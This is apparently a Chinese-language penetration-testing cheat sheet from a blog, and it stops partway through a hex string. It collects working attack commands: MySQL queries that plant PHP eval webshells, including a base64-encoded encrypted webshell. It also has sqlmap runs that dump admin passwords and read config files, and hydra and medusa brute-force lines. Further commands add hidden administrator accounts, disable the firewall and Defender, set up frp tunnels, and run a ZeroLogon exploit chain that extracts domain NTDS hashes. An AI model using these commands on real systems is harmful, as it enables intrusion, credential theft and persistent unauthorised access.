<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -EHirn <span class="hljs-string">&quot;accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into&quot;</span> APKfolder/<br></code></pre></td></tr></table></figure>

<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -ohr -E <span class="hljs-string">&quot;https?://[a-zA-Z0-9\.\/_&amp;=@$%?~#-]*&quot;</span> <span class="hljs-regexp">/app/</span> |<span class="hljs-keyword">sort</span>|uniq &gt;&gt; test.txt<br></code></pre></td></tr></table></figure>

<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>开远程</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">use mysql;  <br><span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> host = <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> = <span class="hljs-string">&#x27;root&#x27;</span>;  <br>FLUSH PRIVILEGES ;  <br><span class="hljs-keyword">select</span> host, <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;<br> mysql -uroot -p -e &quot;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.<span class="hljs-keyword">user</span>;&quot; &gt;1.txt<br></code></pre></td></tr></table></figure>

<p>不登录直接执行sql</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">mysql -uaHmin -proot test -e <span class="hljs-string">&quot;select now()&quot;</span> -N &gt;H:<span class="hljs-regexp">/work/</span>target1.txt<br>mysql -uroot -e <span class="hljs-string">&quot;show databases;&quot;</span> &gt;<span class="hljs-number">1.</span>txt<br></code></pre></td></tr></table></figure>

<p>mysql getshell</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">show variables like &#x27;%secure%&#x27;    </span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[xxx]) <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; into outfile &#x27;/var/www/xx.php&#x27;;  </span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[xx]) <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; into dumpfile &#x27;/var/www/xx.php&#x27;;  </span><br></code></pre></td></tr></table></figure>

<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">set global general_log=on;  </span><br><span class="language-xml">set global general_log_file=&#x27;/var/www/1.php&#x27;;  </span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[s6]) <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;abab.php&quot;</span>,<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&quot;Jmx0Oz9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IA0KCSRfU0VTU0lPTlsmIzM5O2smIzM5O109JGtleTsNCgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgmIzM5O29wZW5zc2wmIzM5OykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpJmx0O3N0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCYjMzk7fCYjMzk7LCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319DQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo/Jmd0Ow0K&quot;</span>));<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; into outfile &#x27;C:/wamp/www/abb.php&#x27;;</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure>

<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://www.vuln.cn/post.php?id=1&quot;</span> <span class="hljs-attr">--proxy</span> <span class="hljs-string">&quot;http://127.0.0.1:1080&quot;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span>  -u <span class="hljs-string">&quot;http://www.vuln.cn&quot;</span> –cookie <span class="hljs-string">&quot;id=11&quot;</span> <span class="hljs-attr">--level</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">python sqlmap.py -u <span class="hljs-string">&quot;www.xxxx.com/product/detail/id/3*.html&quot;</span> <span class="hljs-attribute">--dbms</span>=mysql -v 3 <br></code></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://www.vuln.cn/post.php?id=1&quot;</span>  <span class="hljs-attr">--dbms</span> mysql  <span class="hljs-attr">--dbs</span><br></code></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://www.vuln.cn/post.php?id=1&quot;</span>  <span class="hljs-attr">--dbms</span> mysql  -D test <span class="hljs-attr">--tables</span><br></code></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://www.vuln.cn/post.php?id=1&quot;</span>  <span class="hljs-attr">--dbms</span> mysql  -D test -T admin –-<span class="hljs-attribute">columns</span><br></code></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://www.vuln.cn/post.php?id=1&quot;</span>  <span class="hljs-attr">--dbms</span> mysql -D test -T admin -C <span class="hljs-string">&quot;username,password&quot;</span> <span class="hljs-attr">--dump</span><br></code></pre></td></tr></table></figure>

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -r <span class="hljs-string">&quot;c:\request.txt&quot;</span> -<span class="hljs-keyword">p</span> id –dbms mysql –<span class="hljs-keyword">file</span>-<span class="hljs-keyword">read</span>=<span class="hljs-string">&quot;e:\www\as\config.php&quot;</span><br></code></pre></td></tr></table></figure>

<h2 id="找可写目录"><a href="#找可写目录" class="headerlink" title="找可写目录"></a>找可写目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">### linux</span><br><span class="hljs-comment">#### 在/root  war文件的同目录下</span><br>写<br>find /root -name war|<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> file;<span class="hljs-keyword">do</span> sh -c <span class="hljs-string">&quot;echo <span class="hljs-variable">$file</span>&quot;</span>&gt;$(<span class="hljs-built_in">dirname</span> <span class="hljs-variable">$file</span>)/finddir.txt;<span class="hljs-keyword">done</span><br>删<br>find /root -name war|<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> file;<span class="hljs-keyword">do</span> sh -c <span class="hljs-string">&quot;rm <span class="hljs-subst">$(dirname $file)</span>/finddir.txt&quot;</span>;<span class="hljs-keyword">done</span><br><br><span class="hljs-comment">#### 在/root  war文件夹下</span><br>写<br>find /root -name war|<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> file;<span class="hljs-keyword">do</span> sh -c <span class="hljs-string">&quot;echo <span class="hljs-variable">$file</span>&quot;</span>&gt;<span class="hljs-variable">$file</span>/finddir.txt;<span class="hljs-keyword">done</span><br>删<br>find /root -name war|<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> file;<span class="hljs-keyword">do</span> sh -c <span class="hljs-string">&quot;rm <span class="hljs-variable">$file</span>/finddir.txt&quot;</span>;<span class="hljs-keyword">done</span><br><br><span class="hljs-comment">### windows</span><br><span class="hljs-comment">#### 在C:\Users\liulangmao\Desktop任意子目录  war.txt文件的同目录下</span><br>写<br><span class="hljs-keyword">for</span> /f %i <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;dir /s /b C:\Users\liulangmao\Desktop\war.txt&#x27;</span>) <span class="hljs-keyword">do</span> (<span class="hljs-built_in">echo</span> %i &gt; %i\..\finddir.txt)<br>删<br><span class="hljs-keyword">for</span> /f %i <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;dir /s /b C:\Users\liulangmao\Desktop\war.txt&#x27;</span>) <span class="hljs-keyword">do</span> (del %i\..\finddir.txt)<br><br><span class="hljs-comment">#### 在C:\Users\liulangmao\Desktop任意子目录  war文件夹下</span><br>写<br><span class="hljs-keyword">for</span> /f %i <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;dir /s /b C:\Users\liulangmao\Desktop\war&#x27;</span>) <span class="hljs-keyword">do</span> (<span class="hljs-built_in">echo</span> %i &gt; %i\finddir.txt)<br>删<br><span class="hljs-keyword">for</span> /f %i <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;dir /s /b C:\Users\liulangmao\Desktop\war&#x27;</span>) <span class="hljs-keyword">do</span> (del %i\finddir.txt)<br></code></pre></td></tr></table></figure>

<p>示例：在weblogic靶机&#x2F;root 所有war文件夹下的finddir.txt文件中写入该war文件夹的路径。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">find /root -name war|<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> file;<span class="hljs-keyword">do</span> sh -c <span class="hljs-string">&quot;echo <span class="hljs-variable">$file</span>&quot;</span>&gt;<span class="hljs-variable">$file</span>/finddir.txt;<span class="hljs-keyword">done</span><br><br></code></pre></td></tr></table></figure>

<p> 程序名找启动路径</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic process <span class="hljs-keyword">where</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;mysqld.exe&#x27;</span> <span class="hljs-keyword">get</span> processid,executablepath,<span class="hljs-type">name</span><br></code></pre></td></tr></table></figure>

<p>启动路径找login.jsp</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> /f %i <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;dir /s /b D:\UFGOV\U8\login.jsp&#x27;</span>) <span class="hljs-keyword">do</span> (<span class="hljs-built_in">echo</span> %i)<br></code></pre></td></tr></table></figure>

<p>base64分段不换行追加写文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span>|<span class="hljs-built_in">set</span> /p=\&quot;PCFET0NUWVBFIGh0bWw+IDxodG1sPiA8aGVhZD4gPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+PGgxPjIwMjHlubR4eHjnvZHnu5zlronlhajlrp7miJjmvJTnu4M8L2gxPg==\&quot; &gt; D:\UFGOV\U8\webapps\demonstrate.txt<br></code></pre></td></tr></table></figure>

<p>解决cmd无回显问题</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">powershell</span> <span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">ChildItem</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span><br></code></pre></td></tr></table></figure>


<h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">参数：<br>-l 指定的用户名 -L 用户名字典<br>-p 指定密码 -P 密码字典<br>-s 指定端口 <br>-o 输出文件<br>-t 任务数默认<span class="hljs-number">16</span><br>-f 爆破成功一个就停止<br>-v 报错日志详细 -V 攻击日志<br>&gt;hydra -L <span class="hljs-regexp">/root/u</span>ser.txt -P pass.txt <span class="hljs-number">10.1</span>.<span class="hljs-number">1.10</span> mysql<br>&gt;hydra -L <span class="hljs-regexp">/root/u</span>ser.txt -P pass.txt <span class="hljs-number">10.1</span>.<span class="hljs-number">1.10</span> ssh -s <span class="hljs-number">22</span> -t <span class="hljs-number">4</span><br>&gt;hydra -L <span class="hljs-regexp">/root/u</span>ser.txt -P pass.txt <span class="hljs-number">10.1</span>.<span class="hljs-number">1.10</span> mssql -vv<br>&gt;hydra -L <span class="hljs-regexp">/root/u</span>ser.txt -P pass.txt <span class="hljs-number">10.1</span>.<span class="hljs-number">1.10</span> rdp -V<br>&gt;hydra -L <span class="hljs-regexp">/root/u</span>ser.txt -P pass.txt <span class="hljs-number">10.1</span>.<span class="hljs-number">1.10</span> smb -vV<br>&gt;hydra -L <span class="hljs-regexp">/root/u</span>ser.txt -P pass.txt ftp:<span class="hljs-regexp">//</span><span class="hljs-number">10.1</span>.<span class="hljs-number">1.10</span><br></code></pre></td></tr></table></figure>

<h2 id="medusa"><a href="#medusa" class="headerlink" title="medusa"></a>medusa</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">参数：<br>-h 目标名或IP  -H 目标列表<br>-u 用户名 -U 用户名字典<br>-p 密码 -P 密码字典 -f 爆破成功停止 -M 指定服务 -t 线程<br>-n 指定端口 -e ns 尝试空密码和用户名密码相同<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql</span><br></code></pre></td></tr></table></figure>

<h2 id="python交互shell"><a href="#python交互shell" class="headerlink" title="python交互shell"></a>python交互shell</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python2 -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/sh&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>

<h2 id="无交互添加用户"><a href="#无交互添加用户" class="headerlink" title="无交互添加用户"></a>无交互添加用户</h2><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">useradd <span class="hljs-keyword">new</span><span class="hljs-type">user</span>;echo <span class="hljs-string">&quot;newuser:password&quot;</span>|chpasswd<br></code></pre></td></tr></table></figure>

<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">useradd -p `openssl passwd <span class="hljs-number">123456</span>` guest<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">useradd -p <span class="hljs-string">&quot;<span class="hljs-subst">$(openssl passwd 123456)</span>&quot;</span> guest<br></code></pre></td></tr></table></figure>

<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">useradd <span class="hljs-keyword">new</span><span class="hljs-type">uwer</span>;echo -e <span class="hljs-string">&quot;123456\n123456\n&quot;</span> |passwd <span class="hljs-keyword">new</span><span class="hljs-type">user</span><br></code></pre></td></tr></table></figure>

<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">net<span class="hljs-built_in"> user </span>admin$ Afabab@20 /<span class="hljs-built_in">add</span><br>net localgroup administrators admin$ /<span class="hljs-built_in">add</span><br><br>net<span class="hljs-built_in"> user </span>guest /active:yes<br>net localgroup administrators guest /<span class="hljs-built_in">add</span><br><br>Net localgroup Administrators kent /<span class="hljs-built_in">add</span> /domain 将域用户添加到域管理员组<br><br>Net localgroup Administrators /<span class="hljs-built_in">add</span> test\kent 将域用户添加到本地管理员组<br></code></pre></td></tr></table></figure>

<h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">关闭防火墙<br><br>netsh firewall <span class="hljs-keyword">set</span> opmode mode=<span class="hljs-keyword">disable</span><br><br>放行远程<span class="hljs-number">8888</span>端口进来的流量<br>netsh advfirewall firewall <span class="hljs-keyword">add</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;88&quot; protocol=TCP dir=<span class="hljs-keyword">in</span> remoteport=<span class="hljs-number">8888</span> action=allow<br><br>放行出去到远程<span class="hljs-number">8888</span>端口的流量<br>netsh advfirewall firewall <span class="hljs-keyword">add</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;88&quot; protocol=TCP dir=<span class="hljs-keyword">out</span> remoteport=<span class="hljs-number">8888</span> action=allow<br><br>放行本地<span class="hljs-number">4444</span>端口出去的流量<br>netsh advfirewall firewall <span class="hljs-keyword">add</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;44&quot; protocol=TCP dir=<span class="hljs-keyword">out</span> localport=<span class="hljs-number">4444</span> action=allow<br><br>放行从本地<span class="hljs-number">4444</span>端口进来的流量<br>netsh advfirewall firewall <span class="hljs-keyword">add</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;44&quot; protocol=TCP dir=<span class="hljs-keyword">in</span> localport=<span class="hljs-number">4444</span> action=allow<br><br>删除规则<br>netsh advfirewall firewall <span class="hljs-keyword">delete</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;88&quot;<br><br>查看防火墙配置(可看到具体规则等配置)<br>netsh firewall <span class="hljs-keyword">show</span> config<br><br>关闭windefebd<br>net stop windefend<br><br>netsh firewall <span class="hljs-keyword">set</span> portopening TCP <span class="hljs-number">445</span> <span class="hljs-keyword">ENABLE</span> //打开<span class="hljs-number">445</span>端口    <br>netsh firewall <span class="hljs-keyword">set</span> portopening TCP <span class="hljs-number">3389</span> <span class="hljs-keyword">ENABLE</span> //开放终端  <br>netsh firewall <span class="hljs-keyword">delete</span> allowedprogram C:/A.exe //删除放行程序A.exe   <br>netsh firewall <span class="hljs-keyword">set</span> allowedprogram C:/A.exe test <span class="hljs-keyword">ENABLE</span> //添加程序C盘下的A.exe并放行   <br>netsh firewall <span class="hljs-keyword">add</span> allowedprogram C:/A.exe test <span class="hljs-keyword">ENABLE</span> //添加程序C盘下的A.exe并放行   <br><br>新版本命令   <br><br>netsh advfirewall firewall <span class="hljs-keyword">add</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;test&quot; dir=<span class="hljs-keyword">in</span> action=allow program=&quot;C:\windows\temp\update.exe&quot; <span class="hljs-keyword">enable</span>=yes   <br>netsh advfirewall firewall <span class="hljs-keyword">add</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;test&quot; dir=<span class="hljs-keyword">out</span> action=allow program=&quot;C:\windows\temp\update.exe&quot; <span class="hljs-keyword">enable</span>=yes   <br><br></code></pre></td></tr></table></figure>

<h2 id="frp常用配置"><a href="#frp常用配置" class="headerlink" title="frp常用配置"></a>frp常用配置</h2><p>frpc.ini</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = xxxxxx<br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><br><span class="hljs-section">[rdp]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">local_port</span> = <span class="hljs-number">3389</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">3389</span><br><br><span class="hljs-section">[plugin_http_proxy]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">10801</span><br><span class="hljs-attr">plugin</span> = http_proxy<br><br><span class="hljs-section">[plugin_socks5]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">1080</span><br><span class="hljs-attr">plugin</span> = socks5<br><br></code></pre></td></tr></table></figure>

<h2 id="ZeroLogon"><a href="#ZeroLogon" class="headerlink" title="ZeroLogon"></a>ZeroLogon</h2><ul>
<li>产生日志 4742(利用成功), 5580(利用失败) </li>
<li>流量特征明显</li>
<li>会被av直接秒</li>
<li>有可能会导致目标脱域</li>
<li>代理不稳，容易出问题</li>
</ul>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git clone https:<span class="hljs-comment">//github.com/mstxq17/cve-2020-1472.git</span><br><br>python3 zerologon_tester<span class="hljs-selector-class">.py</span> Dc02 <span class="hljs-number">172.23</span>.<span class="hljs-number">119.120</span> 域外检测<br><br>PingCastle<span class="hljs-selector-class">.exe</span> <span class="hljs-attr">--server</span> <span class="hljs-number">172.23</span>.<span class="hljs-number">119.120</span> <span class="hljs-attr">--scanner</span> zerologon <span class="hljs-attr">--scmode-dc</span> 域内检测<br><br></code></pre></td></tr></table></figure>

<p>洞清空目标域控机器账户密码</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> cve-<span class="hljs-number">2020</span>-<span class="hljs-number">1472</span>-exploit.py Dc02$ <span class="hljs-number">172.23.119.120</span><br><br></code></pre></td></tr></table></figure>

<p>无密码远程提取 ntds.dit</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">python3 secretsdump.py qq.<span class="hljs-keyword">local</span>/<span class="hljs-string">&#x27;Dc02$&#x27;</span><span class="hljs-symbol">@172</span><span class="hljs-number">.23</span><span class="hljs-number">.119</span><span class="hljs-number">.120</span> -no-pass -outputfile qq.<span class="hljs-keyword">local</span>.ntds.hash<br></code></pre></td></tr></table></figure>

<p>用 administrator 域管账户 hash 远程导出域控机器账户 hash [hex 格式]</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python<span class="hljs-number">3</span> secretsdump.py -hashes :ccef<span class="hljs-number">208</span><span class="hljs-keyword">c</span><span class="hljs-number">6485269</span><span class="hljs-keyword">c</span><span class="hljs-number">20</span>db<span class="hljs-number">2</span>cad<span class="hljs-number">21734</span>fe<span class="hljs-number">7</span> qq/administrator<span class="hljs-title">@172</span>.<span class="hljs-number">23.119</span>.<span class="hljs-number">120</span><br></code></pre></td></tr></table></figure>

<p>用上面的 hex 还原目标域控机器账户密码</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python<span class="hljs-number">3</span> restorepassword.py Dc<span class="hljs-number">02</span><span class="hljs-title">@Dc02</span> -<span class="hljs-keyword">target</span>-ip <span class="hljs-number">172.23</span>.<span class="hljs-number">119.120</span> -hexpass daf<span class="hljs-number">1</span>d<span class="hljs-number">2</span>acc<span class="hljs-number">25</span>d<span class="hljs-number">2e54218921737</span>a<span class="hljs-number">40</span>d<span class="hljs-number">58192</span>b<span class="hljs-number">9</span>bcdf<span class="hljs-number">089</span>ddbeaf<span class="hljs-number">9</span>f<span class="hljs-number">7931571</span>b<span class="hljs-number">07916</span>f<span class="hljs-number">96e2</span><span class="hljs-keyword">c</span><span class="hljs-number">51</span>d<span class="hljs-number">8</span>d<span class="hljs-number">00</span>f<span class="hljs-number">56</span>d<span class="hljs-number">2440</span><span class="hljs-keyword">c</span><span class="hljs-number">13</span><span class="hljs-keyword">c</span><span class="hljs-number">0e5586</span>e<span 